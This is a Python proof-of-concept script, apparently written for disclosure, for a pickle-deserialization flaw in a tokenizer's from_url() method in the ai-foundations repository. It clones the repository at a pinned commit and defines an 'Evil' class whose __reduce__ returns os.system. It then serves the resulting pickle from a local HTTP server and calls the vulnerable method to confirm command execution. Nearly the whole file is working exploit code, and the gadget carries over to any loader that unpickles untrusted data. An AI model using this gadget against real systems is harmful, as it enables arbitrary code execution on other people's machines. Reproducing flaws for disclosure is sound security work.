#!/usr/bin/env python3
"""
DeepPickle — google-deepmind/ai-foundations `BPEWordTokenizer.from_url()`
arbitrary code execution via pickle deserialization (CWE-502).

`BPEWordTokenizer.from_url(url)` fetches a URL and feeds the raw response
straight to `pickle.load()`:

    with request.urlopen(url) as response:
        tokenizer = pickle.load(response)     # <-- arbitrary code execution

`pickle` is NOT a safe interchange format: unpickling an attacker-controlled
byte stream executes the object's `__reduce__`/`__reduce_ex__` result.  The
method gives no warning, performs no validation, and does not restrict which
classes may be unpickled, so any URL that serves a crafted pickle achieves RCE
in the process that loads the "tokenizer".

This PoC runs the REAL code path from `google-deepmind/ai-foundations` at the
pinned commit: it serves a malicious pickle over HTTP and calls
`BPEWordTokenizer.from_url()` on it, proving arbitrary command execution.
"""
import os
import pickle
import socketserver
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler

HERE = os.path.dirname(os.path.abspath(__file__))
REPO_URL = "https://github.com/google-deepmind/ai-foundations"
PIN = "5338de78c28ecd87548a3b003038b095abf5cb93"   # vulnerable HEAD (main)
CHECKOUT = os.environ.get("AI_FOUNDATIONS", "/tmp/opencode/ai-foundations")
PWNED = "/tmp/opencode/deepickle_PWNED"


def ensure_repo():
    marker = os.path.join(CHECKOUT, "ai_foundations", "tokenization", "bpe_tokenizer.py")
    if os.path.isfile(marker):
        return
    print(f"[*] cloning {REPO_URL} @ {PIN[:12]}")
    subprocess.run(
        ["git", "clone", "--quiet", "--filter=blob:none", REPO_URL, CHECKOUT],
        check=True,
    )
    subprocess.run(["git", "-C", CHECKOUT, "checkout", "--quiet", PIN], check=True)


class Evil:
    """Minimal gadget: __reduce__ returns (os.system, ("cmd",))."""

    def __reduce__(self):
        return (os.system, (f"id > {PWNED}",))


def main():
    ensure_repo()
    sys.path.insert(0, CHECKOUT)

    # 1) Build the malicious "tokenizer" — a pickle whose __reduce__ runs `id`.
    payload = pickle.dumps(Evil())
    print(f"[*] malicious pickle built ({len(payload)} bytes)")

    # 2) Serve it over HTTP (the attacker-controlled URL).
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, *args):
            pass

    srv = socketserver.TCPServer(("127.0.0.1", 0), Handler)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    # 3) Drive the REAL vulnerable code path.
    from ai_foundations.tokenization.bpe_tokenizer import BPEWordTokenizer

    url = f"http://127.0.0.1:{port}/tokenizer.pkl"
    print(f"[*] calling BPEWordTokenizer.from_url({url!r})")
    try:
        BPEWordTokenizer.from_url(url)
    except Exception as e:
        # os.system returns an int exit code; the method then tries
        # `tokenizer.vocabulary_size` on it and raises.  The command has
        # ALREADY run by this point.
        print(f"[*] from_url raised {type(e).__name__}: {e}")
    finally:
        srv.shutdown()

    print()
    if os.path.exists(PWNED):
        print("[!] RCE CONFIRMED — arbitrary command executed as the loader process:")
        print("    " + open(PWNED).read().strip())
        print("[+] DeepPickle reproduced: pickle deserialization in from_url -> code execution")
        return 0
    print("[!] RCE did not fire (unexpected)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
